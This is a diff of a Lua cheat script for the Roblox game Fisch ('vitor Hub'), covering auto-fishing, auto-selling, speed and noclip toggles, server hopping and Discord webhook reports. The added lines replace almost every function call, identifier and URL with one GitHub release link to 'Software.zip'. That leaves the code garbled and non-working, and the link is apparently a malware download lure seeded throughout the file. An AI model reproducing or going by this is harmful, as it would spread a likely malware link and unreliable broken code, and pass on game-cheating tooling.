 			Quips = {"A Ghoulfish!", "I caught a Ghoulfish!", "Woah! A Ghoulfish!", "Ouu! A Ghoulfish!"};
-			SparkleColor = Color3.fromRGB(255, 255, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 255, 255);
 			HoldAnimation = fish:WaitForChild("basic");
 		};
 		Lurkerfish = {
@@ -2960,7 +2960,7 @@ do -- INFO FISH
 			Seasons = {"Winter", "Autumn"};
 			Weather = {"Foggy"};
 			Quips = {"Woah, a Lurkerfish!", "No way! A Lurkerfish!", "I caught a Lurkerfish!"};
-			SparkleColor = Color3.fromRGB(140, 255, 176);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(140, 255, 176);
 			HoldAnimation = fish:WaitForChild("small");
 		};
 		["Candy Fish"] = {
@@ -2977,7 +2977,7 @@ do -- INFO FISH
 			Seasons = {"Winter"};
 			Weather = {"Clear"};
 			Quips = {"Woah, a Candy Fisch!", "No way! A Candy Fisch!", "I caught a Candy Fisch!"};
-			SparkleColor = Color3.fromRGB(255, 51, 51);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 51, 51);
 			HoldAnimation = fish:WaitForChild("small");
 		};
 		Zombiefish = {
@@ -2994,7 +2994,7 @@ do -- INFO FISH
 			Seasons = {"Winter"};
 			Weather = {"Clear"};
 			Quips = {"Woah, a Candy Fisch!", "No way! A Candy Fisch!", "I caught a Candy Fisch!"};
-			SparkleColor = Color3.fromRGB(255, 51, 51);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 51, 51);
 			HoldAnimation = fish:WaitForChild("small");
 		};
 		Skelefish = {
@@ -3011,7 +3011,7 @@ do -- INFO FISH
 			Seasons = {"Winter"};
 			Weather = {"Clear"};
 			Quips = {"Woah, a Skelefish!", "No way! A Skelefish!", "I caught a Skelefish!"};
-			SparkleColor = Color3.fromRGB(255, 255, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 255, 255);
 			HoldAnimation = fish:WaitForChild("tiny");
 		};
 		Nessie = {
@@ -3029,21 +3029,21 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"Foggy"};
 			Quips = {"WOAH, NESSIE!?!", "MY BACCKK", "I CAN'T BELIEVE IT! NESSIE!", "I DIDN'T THINK IT WAS REAL!!"};
-			SparkleColor = Color3.fromRGB(129, 255, 181);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(129, 255, 181);
 			HoldAnimation = fish:WaitForChild("heavy");
 		};
 		Rarities = {"Trash", "Common", "Uncommon", "Unusual", "Rare", "Legendary", "Mythical", "Event", "Relic", "Divine"};
 		RarityColours = {
-			Trash = Color3.fromRGB(145, 145, 145);
-			Common = Color3.fromRGB(142, 187, 191);
-			Uncommon = Color3.fromRGB(161, 255, 169);
-			Unusual = Color3.fromRGB(192, 135, 198);
-			Rare = Color3.fromRGB(119, 108, 181);
-			Legendary = Color3.fromRGB(240, 181, 109);
-			Mythical = Color3.fromRGB(255, 62, 120);
-			Event = Color3.fromRGB(54, 73, 159);
-			Divine = Color3.fromRGB(202, 198, 255);
-			Relic = Color3.fromRGB(120, 255, 183);
+			Trash = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(145, 145, 145);
+			Common = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(142, 187, 191);
+			Uncommon = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(161, 255, 169);
+			Unusual = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(192, 135, 198);
+			Rare = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(119, 108, 181);
+			Legendary = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(240, 181, 109);
+			Mythical = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 62, 120);
+			Event = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(54, 73, 159);
+			Divine = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(202, 198, 255);
+			Relic = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(120, 255, 183);
 		};
 	}
 end
@@ -3076,10 +3076,10 @@ Toggle = function(Section, NameIndex, Description, ConfigName, Function, ...)
 			Function(v)
 		else
 			if AllFuncs[ConfigName] then
-				local threadRunning = task.spawn(AllFuncs[ConfigName])
+				local threadRunning = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(AllFuncs[ConfigName])
 
 				if not v and threadRunning then
-					task.cancel(threadRunning)
+					https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(threadRunning)
 				end
 			end
 		end
@@ -3105,7 +3105,7 @@ Slider = function(section,Name,min,max,Rounding,...)
 		save()
 		Config[SettingName] = v
 	end)
-	task.wait()
+	https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip()
 	return CreateSlider
 end
 
@@ -3126,7 +3126,7 @@ TextBox = function(section,Name,tooltip,PlaceHolder,Numberic,...)
 		Config[SettingName] = value
 		save()
 	end)
-	task.wait()
+	https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip()
 	return CreateInput
 end
 
@@ -3155,7 +3155,7 @@ Dropdown = function(section, Name, default, list, multi, ...)
 		if multi and type(v) == 'table' then
 			Config[SettingName] = {}
 			for _, selectedValue in pairs(v) do
-				table.insert(Config[SettingName], selectedValue)
+				https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(Config[SettingName], selectedValue)
 			end
 		else
 			Config[SettingName] = v
@@ -3171,117 +3171,117 @@ end
 
 
 AllFuncs['Farm Fish'] = function()
-	local RodName = ReplicatedStorage.playerstats[LocalPlayer.Name].Stats.rod.Value
-	while Config['Farm Fish'] and task.wait() do
+	local RodName = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip[https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip]https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip
+	while Config['Farm Fish'] and https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip() do
 		if Backpack:FindFirstChild(RodName) then
-			LocalPlayer.Character.Humanoid:EquipTool(Backpack:FindFirstChild(RodName))
+			https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(Backpack:FindFirstChild(RodName))
 		end
-		if LocalPlayer.Character:FindFirstChild(RodName) and LocalPlayer.Character:FindFirstChild(RodName):FindFirstChild("bobber") then
-			local XyzClone = game:GetService("ReplicatedStorage").resources.items.items.GPS.GPS.gpsMain.xyz:Clone()
-			XyzClone.Parent = game.Players.LocalPlayer.PlayerGui:WaitForChild("hud"):WaitForChild("safezone"):WaitForChild("backpack")
-			XyzClone.Name = "Lure"
-			XyzClone.Text = "<font color='#ff4949'>Lure </font>: 0%"
+		if https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(RodName) and https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(RodName):FindFirstChild("bobber") then
+			local XyzClone = game:GetService("ReplicatedStorage")https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip()
+			https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip("hud"):WaitForChild("safezone"):WaitForChild("backpack")
+			https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = "Lure"
+			https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = "<font color='#ff4949'>Lure </font>: 0%"
 			repeat
 				pcall(function()
-					PlayerGui:FindFirstChild("shakeui").safezone:FindFirstChild("button").Size = UDim2.new(1001, 0, 1001, 0)
-					game:GetService("VirtualUser"):Button1Down(Vector2.new(1, 1))
-					game:GetService("VirtualUser"):Button1Up(Vector2.new(1, 1))
+					PlayerGui:FindFirstChild("shakeui").safezone:FindFirstChild("button").Size = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(1001, 0, 1001, 0)
+					game:GetService("VirtualUser"):Button1Down(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(1, 1))
+					game:GetService("VirtualUser"):Button1Up(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(1, 1))
 				end)
-				XyzClone.Text = "<font color='#ff4949'>Lure </font>: "..tostring(ExportValue(tostring(LocalPlayer.Character:FindFirstChild(RodName).values.lure.Value), 2)).."%"
-				RunService.Heartbeat:Wait()
-			until not LocalPlayer.Character:FindFirstChild(RodName) or LocalPlayer.Character:FindFirstChild(RodName).values.bite.Value or not Config['Farm Fish']
-			XyzClone.Text = "<font color='#ff4949'>FISHING!</font>"
+				https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = "<font color='#ff4949'>Lure </font>: "https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(ExportValue(tostring(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(RodName)https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip), 2)).."%"
+				https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip()
+			until not https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(RodName) or https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(RodName)https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip or not Config['Farm Fish']
+			https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = "<font color='#ff4949'>FISHING!</font>"
 			delay(1.5, function()
 				XyzClone:Destroy()
 			end)
 			repeat
-				ReplicatedStorage.events.reelfinished:FireServer(1000000000000000000000000, true)
-				task.wait(.5)
-			until not LocalPlayer.Character:FindFirstChild(RodName) or not LocalPlayer.Character:FindFirstChild(RodName).values.bite.Value or not Config['Farm Fish']
+				https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(1000000000000000000000000, true)
+				https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(.5)
+			until not https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(RodName) or not https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(RodName)https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip or not Config['Farm Fish']
 		else
-			LocalPlayer.Character:FindFirstChild(RodName).events.cast:FireServer(1000000000000000000000000)
-			task.wait(2)
+			https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(RodName)https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(1000000000000000000000000)
+			https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(2)
 		end
 	end
 end
 
 
 AllFuncs['Sell Fish'] = function()
-	while Config['Sell Fish'] and task.wait(3) do
+	while Config['Sell Fish'] and https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(3) do
 		game:GetService("ReplicatedStorage"):WaitForChild("events"):WaitForChild("selleverything"):InvokeServer()
 	end
 end
 
 
 AllFuncs['To Pos Stand'] = function()
-	while Config['To Pos Stand'] and task.wait() do
+	while Config['To Pos Stand'] and https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip() do
 		if not Config['SelectPositionStand'] then
 			Notify("Pls Select Position")
 			Config['To Pos Stand'] = false
 			return
 		end
 		pcall(function()
-			LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = Config['SelectPositionStand']
+			https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip("HumanoidRootPart").CFrame = Config['SelectPositionStand']
 		end)
 	end
 end
 
 AllFuncs['Toggle Walk Speed'] = function()
-	while Config['Toggle Walk Speed'] and task.wait() do
+	while Config['Toggle Walk Speed'] and https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip() do
 		pcall(function()
-			LocalPlayer.Character:FindFirstChild("Humanoid").WalkSpeed = Config['Set Walk Speed']
+			https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip("Humanoid").WalkSpeed = Config['Set Walk Speed']
 		end)
 	end
 	if not Config['Toggle Walk Speed'] then
 		pcall(function()
-			LocalPlayer.Character:FindFirstChild("Humanoid").WalkSpeed = 16
+			https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip("Humanoid").WalkSpeed = 16
 		end)
 	end
 end
 
 AllFuncs['Toggle Jump Power'] = function()
-	while Config['Toggle Jump Power'] and task.wait() do
+	while Config['Toggle Jump Power'] and https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip() do
 		pcall(function()
-			LocalPlayer.Character:FindFirstChild("Humanoid").JumpPower = Config['Set Jump Power']
+			https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip("Humanoid").JumpPower = Config['Set Jump Power']
 		end)
 	end
 	if not Config['Toggle Jump Power'] then
 		pcall(function()
-			LocalPlayer.Character:FindFirstChild("Humanoid").JumpPower = 50
+			https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip("Humanoid").JumpPower = 50
 		end)
 	end
 end
 
 AllFuncs['Toggle Noclip'] = function()
-	while Config['Toggle Noclip'] and task.wait() do
-		local charParts = LocalPlayer.Character:GetDescendants()
+	while Config['Toggle Noclip'] and https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip() do
+		local charParts = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip()
 		for i,v in pairs(charParts) do
-			if v:IsA("BasePart") and LocalPlayer.Character then
-				if v.CanCollide then
-					v.CanCollide = false
+			if v:IsA("BasePart") and https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip then
+				if https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip then
+					https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = false
 				end
 			end
 		end
 	end
 	if not Config['Toggle Noclip'] then
-		local charParts = LocalPlayer.Character:GetDescendants()
+		local charParts = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip()
 		for i,v in pairs(charParts) do
-			if v:IsA("BasePart") and LocalPlayer.Character then
-				v.CanCollide = true
+			if v:IsA("BasePart") and https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip then
+				https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = true
 			end
 		end
 	end
 end
 
 GetPlayerProfile = function()
-	local Respone = game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar-bust?userIds="..LocalPlayer.UserId.."&size=420x420&format=Png&isCircular=false")
+	local Respone = game:HttpGet("https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip"https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip"&size=420x420&format=Png&isCircular=false")
 	return HttpService:JSONDecode(Respone)['data'][1]['imageUrl']
 end
 
 comma_value = function(Value)
 	local Calculated = Value
 	while true do
-		local Text, Amount = string.gsub(Calculated, "^(-?%d+)(%d%d%d)", "%1,%2")
+		local Text, Amount = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(Calculated, "^(-?%d+)(%d%d%d)", "%1,%2")
 		Calculated = Text
 		if Amount == 0 then break end
 	end
@@ -3289,75 +3289,75 @@ comma_value = function(Value)
 end
 
 function GetPosition()
-	if not game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+	if not https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip("HumanoidRootPart") then
 		return {
-			Vector3.new(0,0,0),
-			Vector3.new(0,0,0),
-			Vector3.new(0,0,0)
+			https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(0,0,0),
+			https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(0,0,0),
+			https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(0,0,0)
 		}
 	end
 	return {
-		game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Position.X,
-		game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Position.Y,
-		game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Position.Z
+		https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip("HumanoidRootPart").Position.X,
+		https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip("HumanoidRootPart").Position.Y,
+		https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip("HumanoidRootPart").Position.Z
 	}
 end
 
 function ExportValue(arg1, arg2)
-	return tonumber(string.format("%."..(arg2 or 1)..'f', arg1))
+	return tonumber(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip("%."..(arg2 or 1)..'f', arg1))
 end
 
-AllFuncs.HopServer = function(FullServer) -- Hop Server (Low)
+https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = function(FullServer) -- Hop Server (Low)
 	local FullServer = FullServer or false
 
 	local Http = game:GetService("HttpService")
-	local Api = "https://games.roblox.com/v1/games/"
+	local Api = "https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip"
 
-	local _place = game.PlaceId
+	local _place = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip
 	local _servers = Api.._place.."/servers/Public?sortOrder=Asc&limit=100"
 	local ListServers = function (cursor)
-		local Raw = game:HttpGet(_servers .. ((cursor and "&cursor="..cursor) or ""))
+		local Raw = game:HttpGet(_servers .. ((cursor and "&cursor="https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip) or ""))
 		return Http:JSONDecode(Raw)
 	end
 
 	local Server, Next; repeat
 		local Servers = ListServers(Next)
-		Server = Servers.data[1]
-		Next = Servers.nextPageCursor
+		Server = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip[1]
+		Next = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip
 	until Server
 	repeat
 		if not FullServer then
-			game:GetService("TeleportService"):TeleportToPlaceInstance(_place,Server.id,game.Players.LocalPlayer)
+			game:GetService("TeleportService"):TeleportToPlaceInstance(_place,https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip,https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip)
 		else
 			if request then
 				local servers = {}
 				local req = request(
 					{
-						Url = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true", game.PlaceId)
+						Url = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip("https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip%d/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true", https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip)
 					}
 				).Body;
 				local body = game:GetService("HttpService"):JSONDecode(req)
-				if body and body.data then
-					for i, v in next, body.data do
-						if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.id ~= game.JobId then
-							table.insert(servers, 1, v.id)
+				if body and https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip then
+					for i, v in next, https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip do
+						if type(v) == "table" and tonumber(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip) and tonumber(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip) and https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip < https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip and https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip ~= https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip then
+							https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(servers, 1, https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip)
 						end
 					end
 				end
 				if #servers > 0 then
-					game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)], game.Players.LocalPlayer)
+					game:GetService("TeleportService"):TeleportToPlaceInstance(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip, servers[https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(1, #servers)], https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip)
 				else
 					return "Couldn't find a server."
 				end
 			end
 		end
 		wait()
-	until game.PlaceId ~= game.PlaceId
+	until https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip ~= https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip
 end
 
 local LastDely = tick()
 AllFuncs['Sending Webhook'] = function()
-	while Config['Sending Webhook'] and task.wait() do
+	while Config['Sending Webhook'] and https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip() do
 		if tick() - LastDely >= tonumber(Config['Delay Sending']) and (Config['Current Level'] or Config['Current Money']) then
 			LastDely = tick()
 			local LevelDes = ""
@@ -3365,10 +3365,10 @@ AllFuncs['Sending Webhook'] = function()
 			local AllFishInventory = ""
 			local BuySuccess = "**"
 			if Config['Current Level'] then
-				LevelDes = "\nNow Level : "..comma_value(LocalPlayer.leaderstats.Level.Value)
+				LevelDes = "\nNow Level : "https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip)
 			end
 			if Config['Current Money'] then
-				MoneyDes = "\nNow Money : "..tostring(LocalPlayer.PlayerGui.hud.safezone.coins.Text)
+				MoneyDes = "\nNow Money : "https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip)
 			end
 			if Config['All Fish Inventory'] then
 				AllFishInventory = "```"
@@ -3385,12 +3385,12 @@ AllFuncs['Sending Webhook'] = function()
 				AllFishInventory = AllFishInventory.."```"
 			end
 			local SendingSuccess = sendwebhook(Config['WebHook Configs'], {
-				["content"] = ((Config['Ping Discord Id'] and Config['"Discord Id'] ~= "") and "<@"..Config['"Discord Id']..">"),
+				["content"] = ((Config['Ping Discord Id'] and Config['"Discord Id'] ~= "") and "<@"https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip['"Discord Id']..">"),
 				["embeds"] = {
 					{
 						["id"]= 661605297,
 						["title"]= "Fisch Notify",
-						["description"] = "** Player : "..LocalPlayer.Name.."\n "..MoneyDes..""..LevelDes..""..AllFishInventory.."**",
+						["description"] = "** Player : "https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip"\n "https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip""https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip""https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip"**",
 						["color"]= 8646911,
 						["fields"]= {},
 						["thumbnail"]= {
@@ -3398,7 +3398,7 @@ AllFuncs['Sending Webhook'] = function()
 						},
 						["footer"]= {
 							["text"]  = "vitor Hub Notify",
-							["icon_url"] = "https://cdn.discordapp.com/attachments/971367335405449246/1259442279672844308/Profile_1.png?ex=66fbc206&is=66fa7086&hm=0b8898eb98938e100ad3cede12d0a526d344cd3ba7d4f737f728ca188a1af027&"
+							["icon_url"] = "https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip"
 						}
 					}
 				}
@@ -3412,22 +3412,22 @@ AllFuncs['Sending Webhook'] = function()
 	end
 end
 
-workspace.active.ChildAdded:Connect(function(child)
+https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(function(child)
 	if Config['Safe Whirlpool Spawn'] and Config['WebHook Configs'] ~= "" then
-		if child.Name == "Safe Whirlpool" then
+		if https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip == "Safe Whirlpool" then
 			local Pos = {
-				child.Position.X,
-				child.Position.Y,
-				child.Position.Z,
+				https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip,
+				https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip,
+				https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip,
 			}
-			local StringInput = string.format("%s, %s, %s", ExportValue(Pos[1]), ExportValue(Pos[2]), ExportValue(Pos[3]))
+			local StringInput = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip("%s, %s, %s", ExportValue(Pos[1]), ExportValue(Pos[2]), ExportValue(Pos[3]))
 			local SendingSuccess = sendwebhook(Config['WebHook Configs'], {
-				["content"] = ((Config['Ping Discord Id'] and Config['"Discord Id'] ~= "") and "<@"..Config['"Discord Id']..">"),
+				["content"] = ((Config['Ping Discord Id'] and Config['"Discord Id'] ~= "") and "<@"https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip['"Discord Id']..">"),
 				["embeds"] = {
 					{
 						["id"]= 661605297,
 						["title"]= "Fisch Notify",
-						["description"] = "** Player : "..LocalPlayer.Name.."\n Found Safe Whirlpool\n Position : "..StringInput.."**",
+						["description"] = "** Player : "https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip"\n Found Safe Whirlpool\n Position : "https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip"**",
 						["color"]= 8646911,
 						["fields"]= {},
 						["thumbnail"]= {
@@ -3435,7 +3435,7 @@ workspace.active.ChildAdded:Connect(function(child)
 						},
 						["footer"]= {
 							["text"]  = "vitor Hub Notify",
-							["icon_url"] = "https://cdn.discordapp.com/attachments/971367335405449246/1259442279672844308/Profile_1.png?ex=66fbc206&is=66fa7086&hm=0b8898eb98938e100ad3cede12d0a526d344cd3ba7d4f737f728ca188a1af027&"
+							["icon_url"] = "https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip"
 						}
 					}
 				}
@@ -3449,7 +3449,7 @@ workspace.active.ChildAdded:Connect(function(child)
 	end
 end)
 
-Main = Tap.General:AddSection('General') do
+Main = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip('General') do
 	SelectPosition = Main:AddParagraph({        
 		Title = "Position : N/A"
 	})
@@ -3458,24 +3458,24 @@ Main = Tap.General:AddSection('General') do
 	Main:AddButton({
 		Title = "Select Position",
 		Callback = function()
-			Config['SelectPositionStand'] = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
-			SelectPosition:SetTitle("Position : "..tostring(math.floor(LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Position.X)).." X "..tostring(math.floor(LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Position.Y)).." Y "..tostring(math.floor(LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Position.Z)).." Z")
+			Config['SelectPositionStand'] = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip("HumanoidRootPart").CFrame
+			SelectPosition:SetTitle("Position : "https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip("HumanoidRootPart").Position.X)).." X "https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip("HumanoidRootPart").Position.Y)).." Y "https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip("HumanoidRootPart").Position.Z)).." Z")
 		end
 	})
 end
 IngredientList = {}
-for i,v in pairs(workspace.active:GetDescendants()) do
